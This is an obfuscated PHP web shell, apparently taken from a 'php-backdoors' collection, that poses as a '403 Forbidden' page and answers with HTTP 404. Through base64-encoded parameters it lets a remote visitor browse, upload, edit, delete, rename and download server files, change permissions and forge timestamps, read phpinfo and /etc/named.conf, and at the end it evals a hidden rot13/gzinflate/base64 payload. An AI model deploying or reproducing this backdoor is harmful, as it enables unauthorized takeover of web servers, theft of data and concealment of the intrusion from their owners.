<?php // from https://github.com/1337r0j4n/php-backdoors
goto jftpU;
XlRbQ:
foreach (array_merge($dirs, $files) as $path) {
    $d = is_dir($path);
    $w = is_writable($path); ?>
    <tr>
        <td class="<?php echo ($d ? "\144\151\x72\145\x63\x74\x6f\x72\x79" : "\146\151\x6c\145") . "\40" . ($w ? "\167\x72\151\x74\141\x62\154\145" : "\x6e\x6f\164\167\x72\x69\164\x61\x62\x6c\x65"); ?>
"><a href="?<?php echo $d ? "\x64\x69\162\x3d" . e($path) . '' : "\x66\151\154\145\75" . e($path) . "\x26" . $edir; ?>
"><?php echo htmlspecialchars(basename($path)); ?>
            </a><?php echo is_link($path) ? "\x3c\x73\160\x61\156\x20\143\x6c\141\x73\163\75\42\163\171\x6d\154\151\156\153\42\x3e" . readlink($path) . "\x3c\57\163\160\141\x6e\x3e" : ''; ?>
        </td>
        <td><?php echo $d ? "\55\x2d\55" : size($path); ?>
        </td>
        <td><a href="?chtime=<?php echo e($path) . "\46" . $edir; ?>
" class="btn" onclick='return chtime(this,"<?php $chtime = date("\115\x2d\x64\55\131\x20\110\x3a\x69\72\x73", filemtime($path));
                                            echo $chtime; ?>
")'><?php echo $chtime; ?>
            </a></td>
        <td><a href="?chmod=<?php echo e($path) . "\46" . $edir; ?>
" class="btn" onclick='return chmod(this,"<?php echo substr(sprintf("\45\x6f", @fileperms($path)), -4); ?>
")'><?php echo perms($path); ?>
            </a></td>
        <td><?php if (basename($path) !== "\x2e\x2e") { ?>
                <a href="?delete=<?php echo e($path) . "\46" . $edir; ?>
" class="btn icon delete" onclick='return confirm("Sure to delete?")' title="Delete"></a><a href="?rename=<?php echo e($path) . "\x26" . $edir; ?>
" class="btn icon rename" onclick='return rename(this,"<?php echo basename($path); ?>
")' title="Rename"></a><?php if (!$d) {
                            echo "\74\141\40\x74\x69\164\x6c\145\x3d\42\x44\157\x77\x6e\x6c\157\141\144\42\x20\x63\x6c\x61\163\x73\75\42\142\x74\x6e\40\x69\143\x6f\x6e\x20\144\157\167\156\154\x6f\x61\x64\42\40\150\x72\145\x66\x3d\42\x3f\x64\154\x3d" . e($path) . "\42\x3e\x3c\x2f\141\76";
                        }
                    } ?>
        </td>
    </tr><?php  }
        goto sxAjy;
        hPs32:
        echo $dir;
        goto m1QUh;
        wPxEo:
        echo $_SERVER["\122\105\x4d\x4f\x54\x45\x5f\x41\104\104\x52"];
        goto JDqVU;
        x1s75:
        $dir = $dir ? $dir : __DIR__;
        goto Ws2q7;
        sCoxG:
        if (isset($_GET["\143\x68\x74\151\155\145"], $_GET["\156\145\167"])) {
            if (touch($_GET["\143\x68\164\151\155\145"], intval(strtotime($_GET["\156\145\x77"])))) {
                echo "\74\163\x70\141\x6e\40\x63\x6c\x61\x73\x73\75\42\x73\165\143\x63\x65\x73\x73\x22\x3e\124\x49\115\x45\x20\x4d\101\103\x48\x49\x4e\105\x20\123\x55\103\103\105\123\x53\x21\74\57\x73\160\141\x6e\76";
            } else {
                echo "\x3c\163\160\x61\x6e\x20\x63\x6c\141\x73\x73\x3d\x22\146\141\151\154\x65\x64\x22\x3e\124\x49\115\x45\40\115\x41\x43\x48\111\x4e\x45\40\x46\x41\x49\114\x45\x44\x21\x3c\x2f\163\x70\141\x6e\x3e";
            }
        }
        goto Dbb9T;
        EJMxG:
        function perms($path)
        {
            clearstatcache();
            $perms = fileperms($path);
            $x = array("\125", "\160", "\x63", "\x55", "\144", "\125", "\142", "\125", "\x72", "\125", "\x6c", "\125", "\163", "\125", "\125", "\125");
            $info = $x[$perms >> 12] . implode('', array_map(function ($b, $m) {
                return $b == "\61" ? $m : "\55";
            }, str_split(decbin($perms & 4095) . ''), str_split("\162\167\x78\x72\x77\x78\162\167\170")));
            return $info . "\x20" . substr(sprintf("\x25\x6f", @fileperms($path)), -4);
        }
        goto cLtwK;
        m1QUh: ?>
"><button>GO</button><a href="?dir=<?php goto LZJ23;
                                    LpZSp:
                                    $dirs = array();
                                    goto gZWA2;
                                    P16Sh:
                                    function symlinkDomain($dom)
                                    {
                                        $d0mains = @file("\57\x65\x74\143\x2f\x6e\141\155\x65\144\x2e\x63\x6f\156\x66", false);
                                        if (!$d0mains) {
                                            $dom = "\x3c\x66\157\x6e\164\40\143\157\154\157\162\75\162\145\144\x20\163\151\x7a\145\x3d\x33\160\x78\76\x43\141\x6e\164\x20\x52\x65\x61\144\x20\x5b\40\x2f\x65\x74\x63\57\156\x61\155\145\x64\x2e\x63\x6f\156\146\40\135\x3c\57\x66\157\156\164\76";
                                            $GLOBALS["\x6e\x65\145\x64\x5f\164\157\x5f\165\160\x64\141\x74\x65\x5f\150\145\x61\x64\145\162"] = "\x74\162\x75\145";
                                        } else {
                                            $count = 0;
                                            foreach ($d0mains as $d0main) {
                                                if (@strstr($d0main, "\x7a\157\x6e\x65")) {
                                                    preg_match_all("\43\x7a\157\x6e\145\40\x22\x28\56\52\x29\42\x23", $d0main, $domains);
                                                    flush();
                                                    if (strlen(trim($domains[1][0])) > 2) {
                                                        flush();
                                                        $count++;
                                                    }
                                                }
                                            }
                                            $dom = "{$count}\x20\x44\157\x6d\x61\151\x6e";
                                        }
                                        return $dom;
                                    }
                                    goto eCm9p;
                                    rBvqN:
                                    echo is_writable($dir) ? "\x77\x72\151\x74\141\x62\154\x65" : "\x6e\x6f\x74\167\162\x69\x74\x61\142\x6c\145";
                                    goto OuL0o;
                                    cLtwK:
                                    if (!function_exists("\160\x6f\x73\x69\170\x5f\147\145\164\x70\x77\165\151\144") && !extension_loaded("\x70\x6f\x73\x69\170")) {
                                        function posix_getpwuid($x)
                                        {
                                            return array("\x6e\x61\155\145" => "\55\55\55");
                                        }
                                    }
                                    goto K42CU;
                                    LR6tS:
                                    if (isset($_GET["\x66\151\x6c\145"])) {
                                        if (isset($_POST["\145\x64\x69\164"])) {
                                            if (@file_put_contents($_GET["\146\151\x6c\145"], $_POST["\145\x64\151\164"])) {
                                                echo "\74\163\x70\x61\x6e\40\x63\154\141\x73\163\x3d\x22\163\x75\143\x63\x65\163\163\42\76\105\x44\111\124\40\x53\x55\x43\x43\x45\x53\123\41\74\57\163\160\141\156\76";
                                            } else {
                                                echo "\74\x73\160\x61\156\40\x63\x6c\141\x73\163\x3d\x22\x66\x61\x69\154\145\144\x22\76\x45\104\111\x54\x20\106\x41\x49\114\105\x44\x21\x3c\x2f\163\x70\141\156\x3e";
                                            }
                                        }
                                        echo "\74\146\x6f\x72\x6d\x20\141\143\x74\x69\x6f\x6e\x3d\x22\77\146\x69\154\x65\75" . e($_GET["\146\x69\x6c\x65"]) . "\x26" . $edir . "\42\x20\155\x65\164\150\x6f\144\x3d\x22\160\157\x73\164\x22\40\x6f\x6e\163\165\x62\155\x69\x74\x3d\42\x65\144\x69\164\x2e\x76\x61\154\165\145\x3d\145\x28\x65\x64\151\x74\x2e\166\141\x6c\x75\x65\x29\42\x3e\x3c\x74\145\x78\164\x61\x72\x65\141\40\151\144\75\x22\145\144\151\x74\x22\x20\x6e\141\155\x65\x3d\x22\145\x64\151\164\42\76" . htmlspecialchars(file_get_contents($_GET["\x66\151\x6c\x65"]), ENT_QUOTES | ENT_SUBSTITUTE | ENT_COMPAT, "\x55\x54\106\55\x38") . "\74\57\164\x65\170\x74\141\162\x65\141\76\x3c\142\165\x74\x74\x6f\x6e\76\125\x70\x64\x61\x74\145\x3c\57\142\x75\164\x74\157\156\x3e\x3c\x2f\146\x6f\162\155\x3e";
                                    }
                                    goto UtMjm;
                                    fEYxs: ?>
">[Shell Path]</a></form>
<table>
    <tr>
        <th></th>
        <th>SIZE</th>
        <th>Modified Date</th>
        <th>PERMS</th>
        <th>ACTION</th>
    </tr><?php goto XlRbQ;
            B1jhW:
            function e($s)
            {
                return base64_encode($s);
            }
            goto c7Q09;
            Ws2q7:
            chdir($dir);
            goto Ieky2;
            xD2Xi: ?>
    <br><a href="?info=info" class="btn" target="__blank">SERVER INFO</a>:<?php goto XC1Yu;
                                                                            eMOpg:
                                                                            foreach (scandir($dir) as $p) {
                                                                                if (is_dir($dir . "\57" . $p)) {
                                                                                    if ($p != "\x2e") {
                                                                                        $dirs[] = $dir . "\57" . $p;
                                                                                    }
                                                                                } else {
                                                                                    $files[] = $dir . "\x2f" . $p;
                                                                                }
                                                                            }
                                                                            goto moCtt;
                                                                            FaueU:
                                                                            if (isset($_GET["\x63\150\155\157\144"], $_GET["\156\145\167"])) {
                                                                                if (chmod($_GET["\x63\x68\x6d\x6f\144"], intval($_GET["\156\x65\x77"], 8))) {
                                                                                    echo "\x3c\163\160\x61\x6e\x20\x63\154\141\163\x73\75\42\x73\x75\143\x63\145\163\x73\x22\x3e\x43\x48\x4d\x4f\x44\40\123\125\x43\x43\x45\x53\123\x21\x3c\x2f\x73\x70\x61\156\x3e";
                                                                                } else {
                                                                                    echo "\x3c\x73\x70\x61\156\x20\x63\154\x61\163\x73\x3d\42\146\x61\x69\x6c\145\x64\x22\x3e\103\110\115\117\x44\x20\106\x41\x49\114\x45\104\41\x3c\57\x73\160\141\x6e\76";
                                                                                }
                                                                            }
                                                                            goto sCoxG;
                                                                            Yw6Fi:
                                                                            foreach ($_POST as $k => $v) {
                                                                                $_POST[$k] = d($v);
                                                                            }
                                                                            goto LJQkQ;
                                                                            m2IZa:
                                                                            echo $edir;
                                                                            goto UJMti;
                                                                            UJMti: ?>
    "enctype="multipart/form-data"method="post"><input class="<?php goto rBvqN;
                                                                GKrTq:
                                                                foreach ($_GET as $k => $v) {
                                                                    $_GET[$k] = d($v);
                                                                }
                                                                goto Yw6Fi;
                                                                OuL0o: ?>
" name="file" type="file"><button type="submit">Upload</button></form>
    <center><?php goto QeiKN;
            iCNet:
            echo e(realpath(__DIR__));
            goto fEYxs;
            JDqVU: ?>
        <br>SERVER IP:<?php goto veYrr;
                        c7Q09:
                        function d($s)
                        {
                            return base64_decode($s);
                        }
                        goto zTEkQ;
                        XC1Yu:
                        echo php_uname();
                        goto FIKKi;
                        Ieky2:
                        $edir = "\x64\x69\x72\x3d" . e($dir);
                        goto hKpRM;
                        gZWA2:
                        $files = array();
                        goto eMOpg;
                        K42CU: ?>
        <!doctypehtml>
            <html>

            <head>
                <meta content="width=device-width,initial-scale=0.5,user-scalable=yes" name="viewport">
                <title>403 Forbidden</title>
                <style>
                    body,
                    button,
                    html,
                    input {
                        background: #000;
                        color: gray;
                        font-family: monospace
                    }

                    a {
                        color: gray;
                        text-decoration: none
                    }

                    button,
                    input {
                        border: 1px solid gray;
                        height: 1.7em
                    }

                    table {
                        width: 100%;
                        border: 1px dotted gray;
                        border-spacing: 0
                    }

                    tr:hover {
                        background: #161616
                    }

                    td,
                    th {
                        padding: 2px 0;
                        border: 1px solid #666
                    }

                    textarea {
                        width: 80%;
                        height: 50vh;
                        background: #000;
                        color: green;
                        tab-size: 4
                    }

                    .btn {
                        border: 1px solid #666;
                        border-radius: .3em;
                        padding: 0 .3em;
                        display: inline-block;
                        text-align: center
                    }

                    .btn:hover {
                        border-color: #fff;
                        background-color: #000;
                        transition: background-color .2s linear
                    }

                    .directory {
                        background: #444654
                    }

                    .directory:before {
                        content: "DIR/";
                        color: gray
                    }

                    .file {
                        background: #343641
                    }

                    .file:before {
                        content: "-";
                        color: gray
                    }

                    .notwritable,
                    .notwritable a {
                        color: #ff7800
                    }

                    .writable,
                    .writable a {
                        color: #49ff00
                    }

                    .symlink {
                        float: right;
                        color: #e2c275
                    }

                    .icon {
                        font-size: 1.5em;
                        padding: .1em .2em;
                        margin: 0
                    }

                    .delete:before {
                        content: "\1F6AE";
                        opacity: .7
                    }

                    .rename:before {
                        content: "\270D";
                        color: #00f
                    }

                    .download:before {
                        content: "\2193\2193";
                        color: green
                    }

                    .openlink:before {
                        content: "\1F517"
                    }

                    .success {
                        color: #ff0
                    }

                    .success:before {
                        content: "\270C"
                    }

                    .failed {
                        color: red
                    }

                    .failed:before {
                        content: "\2622"
                    }
                </style>
                <script>
                    function e(e) {
                        return btoa(e)
                    }

                    function chmod(n, r) {
                        var t = prompt("CHMOD:", r);
                        return !!t && (n.href += "&new=" + e(t), !0)
                    }

                    function chtime(n, r) {
                        var t = prompt("Change modified time:", r);
                        return !!t && (n.href += "&new=" + e(t), !0)
                    }

                    function rename(n, r) {
                        var t = prompt("Rename:", r);
                        return !!t && (n.href += "&new=" + e(t), !0)
                    }
                </script>
            </head>

            <body>YOUR IP:<?php goto wPxEo;
                            hKpRM:
                            if (isset($_GET["\144\154"])) {
                                if (!realpath($_GET["\x64\154"])) {
                                    die;
                                }
                                header("\x43\157\x6e\x74\145\x6e\x74\x2d\104\145\x73\x63\162\151\160\164\151\157\156\72\x20\106\x69\154\x65\40\124\x72\x61\x6e\x73\x66\x65\x72");
                                header("\103\157\156\164\x65\x6e\164\55\x54\x79\x70\145\x3a\x20\x61\x70\160\154\151\143\141\164\151\157\156\57\157\x63\x74\145\x74\55\x73\164\x72\145\141\155");
                                header("\103\157\156\x74\x65\x6e\164\x2d\x44\x69\163\160\157\163\x69\164\151\157\156\72\40\x61\164\164\141\x63\150\x6d\x65\x6e\x74\x3b\x20\146\151\154\x65\156\x61\155\145\75\x22" . basename($_POST["\144\x6c"]) . "\42");
                                readfile($_GET["\x64\154"]);
                                die;
                            }
                            goto kewHO;
                            veYrr:
                            echo gethostbyname($_SERVER["\x48\124\x54\120\137\x48\x4f\123\124"]) . "\x20\57\40" . $_SERVER["\123\105\x52\x56\105\122\137\116\101\115\x45"];
                            goto q3FKZ;
                            FIKKi: ?>
                <br>
                <form action="?<?php goto m2IZa;
                                zTEkQ:
                                if (isset($_GET["\x69\x6e\146\157"]) && $_GET["\x69\156\146\157"] === "\x69\x6e\x66\157") {
                                    phpinfo();
                                    die;
                                }
                                goto GKrTq;
                                LZJ23:
                                echo e(realpath($_SERVER["\x44\x4f\103\x55\115\x45\116\124\x5f\x52\117\x4f\124"]));
                                goto KXE3_;
                                UtMjm:
                                if (isset($_GET["\x64\x65\x6c\145\164\145"])) {
                                    $x = str_replace("\130", '', "\x58\165\130\x6e\x58\x6c\x58\x69\130\156\130\153\130");
                                    if ($x($_GET["\x64\x65\x6c\145\164\x65"])) {
                                        echo "\74\163\x70\x61\156\40\x63\154\x61\163\163\x3d\x22\x73\x75\143\143\145\163\163\42\76\104\105\114\105\x54\105\x20\x53\125\x43\103\x45\x53\123\41\x3c\57\x73\160\141\156\x3e";
                                    } else {
                                        echo "\74\163\160\141\x6e\40\143\x6c\141\163\163\75\x22\146\x61\x69\x6c\x65\x64\x22\x3e\x44\x45\x4c\x45\x54\105\40\106\101\111\114\x45\x44\41\74\x2f\x73\160\141\156\x3e";
                                    }
                                }
                                goto FaueU;
                                KXE3_: ?>
">[Root Path]</a><a href="?dir=<?php goto iCNet;
                                eCm9p: ?>
DOMAIN ON SERVER :<?php goto Ub2Ba;
                    kewHO:
                    function size($path, $decimals = 0)
                    {
                        $bytes = filesize($path);
                        $factor = floor((strlen($bytes) - 1) / 3);
                        if ($factor > 0) {
                            $sz = "\113\115\x47\x54";
                        }
                        return sprintf("\x25\56{$decimals}\146", $bytes / pow(1024, $factor)) . @$sz[$factor - 1] . "\102";
                    }
                    goto EJMxG;
                    Ub2Ba:
                    echo symlinkDomain($dom);
                    goto xD2Xi;
                    Dbb9T:
                    if (isset($_GET["\x72\145\x6e\x61\x6d\145"], $_GET["\156\x65\167"])) {
                        if (rename($_GET["\162\x65\156\141\155\145"], $dir . "\57" . basename($_GET["\x6e\145\x77"]))) {
                            echo "\x3c\163\160\141\156\x20\143\154\x61\x73\163\75\x22\x73\x75\143\143\145\163\163\x22\x3e\122\x45\x4e\x41\115\105\x20\123\x55\x43\x43\x45\x53\x53\41\x3c\x2f\163\160\x61\x6e\76";
                        } else {
                            echo "\x3c\x73\x70\x61\156\x20\x63\154\141\163\x73\x3d\x22\146\141\x69\x6c\x65\144\42\76\x52\105\116\x41\x4d\105\40\x46\101\x49\114\105\104\41\x3c\x2f\163\x70\x61\156\76";
                        }
                    }
                    goto LpZSp;
                    iM4rT:
                    ini_set("\144\151\163\x70\154\141\171\x5f\163\164\x61\162\x74\x75\x70\x5f\145\x72\162\157\x72\x73", 1);
                    goto jicsp;
                    tzs1d: ?>
" name="dir" id="dir" style="width:500px" value="<?php goto hPs32;
                                                    QeiKN:
                                                    if (isset($_FILES["\x66\151\x6c\145"])) {
                                                        if (move_uploaded_file($_FILES["\146\151\x6c\x65"]["\x74\155\x70\137\156\x61\x6d\145"], basename($_FILES["\146\x69\x6c\x65"]["\x6e\x61\x6d\145"]))) {
                                                            echo "\74\163\x70\x61\x6e\40\143\154\x61\163\163\75\x22\163\165\143\x63\145\163\x73\42\76\x55\x50\x4c\117\101\104\x20\123\125\103\x43\105\123\x53\x21\x3c\57\163\160\x61\x6e\x3e";
                                                        } else {
                                                            echo "\74\x73\x70\141\156\40\x63\154\141\163\163\75\x22\146\x61\151\154\x65\144\42\76\125\120\x4c\x4f\x41\104\40\x46\x41\x49\x4c\105\x44\41\74\57\163\160\x61\x6e\76";
                                                        }
                                                    }
                                                    goto LR6tS;
                                                    moCtt: ?>
</center><form onsubmit=" dir.value=e(dir.value)">Directory: <input class="<?php goto UGzkw;
                                                                            jftpU:
                                                                            ini_set("\x64\x69\163\x70\x6c\x61\x79\x5f\145\x72\x72\157\162\x73", 1);
                                                                            goto iM4rT;
                                                                            q3FKZ: ?>
<br><?php goto P16Sh;
    jicsp:
    error_reporting(0);
    goto jnJQU;
    jnJQU:
    http_response_code(404);
    goto B1jhW;
    LJQkQ:
    $dir = realpath(isset($_GET["\x64\151\x72"]) ? $_GET["\x64\x69\x72"] : __DIR__);
    goto x1s75;
    UGzkw:
    echo is_writable($dir) ? "\x77\162\151\x74\x61\x62\154\x65" : "\156\x6f\164\x77\x72\151\164\141\142\x6c\x65";
    goto tzs1d;
    sxAjy:
    eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B'))))); ?>
</table>Modified By #No_Identity :: <a href=" https://github.com/yon3zu">github.com/yon3zu</a> - <a href="https://linuxploit.com/">linuxploit.com</a>
            </body>

            </html>